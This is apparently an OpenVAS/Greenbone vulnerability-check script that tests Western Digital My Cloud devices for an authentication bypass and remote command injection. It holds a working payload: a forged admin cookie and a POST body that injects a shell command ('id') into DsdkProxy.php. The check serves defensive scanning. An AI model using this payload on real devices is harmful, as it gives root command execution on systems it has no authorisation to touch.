CPE_PREFIX = "cpe:/o:wdc";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.108149" );
	script_version( "2020-10-21T14:23:11+0000" );
	script_tag( name: "last_modification", value: "2020-10-21 14:23:11 +0000 (Wed, 21 Oct 2020)" );
	script_tag( name: "creation_date", value: "2017-04-21 08:00:00 +0200 (Fri, 21 Apr 2017)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_name( "Western Digital My Cloud Products Authentication Bypass and Multiple Remote Command Injection Vulnerabilities" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2017 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_wd_mycloud_consolidation.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "wd-mycloud/http/detected" );
	script_xref( name: "URL", value: "http://support.wdc.com/downloads.aspx?lang=en#firmware" );
	script_xref( name: "URL", value: "https://www.exploitee.rs/index.php/Western_Digital_MyCloud" );
	script_tag( name: "summary", value: "Western Digital My Cloud Products are prone to an authentication
  bypass and multiple remote command injection vulnerabilities." );
	script_tag( name: "vuldetect", value: "Send a crafted HTTP POST request and check the response." );
	script_tag( name: "impact", value: "Successful exploit allows an attacker to execute arbitrary commands
  with root privileges in context of the affected application." );
	script_tag( name: "solution", value: "The vendor has released firmware updates. Please see the reference
  for more details and downloads." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_tag( name: "qod_type", value: "remote_app" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
require("list_array_func.inc.sc");
if(!infos = get_app_port_from_cpe_prefix( cpe: CPE_PREFIX, service: "www" )){
	exit( 0 );
}
CPE = infos["cpe"];
if(!CPE || ( !ContainsString( CPE, "my_cloud" ) && !ContainsString( CPE, "wd_cloud" ) )){
	exit( 0 );
}
port = infos["port"];
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
url = dir + "/web/dsdk/DsdkProxy.php";
data = "';echo `id`;'";
cookie = "isAdmin=1;username=admin\" -s 1337 -c \"";
req = http_post_put_req( port: port, url: url, data: data, accept_header: "application/xml, text/xml, */*; q=0.01", add_headers: make_array( "Content-Type", "application/x-www-form-urlencoded", "Cookie", cookie ) );
res = http_keepalive_send_recv( port: port, data: req, bodyonly: FALSE );
if(IsMatchRegexp( res, "HTTP/1\\.[01] 200" ) && IsMatchRegexp( res, "uid=[0-9]+.*gid=[0-9]+" )){
	uid = eregmatch( pattern: "(uid=[0-9]+.*gid=[0-9]+[^ ]+)", string: res );
	info["\"HTTP POST\" body"] = data;
	info["Cookie"] = cookie;
	info["URL"] = http_report_vuln_url( port: port, url: url, url_only: TRUE );
	report = "By doing the following request:\n\n";
	report += text_format_table( array: info ) + "\n\n";
	report += "it was possible to execute the \"id\" command.";
	report += "\n\nResult: " + uid[1];
	expert_info = "Request:\n" + req + "Response:\n" + res + "\n";
	security_message( port: port, data: report, expert_info: expert_info );
	exit( 0 );
}
exit( 99 );

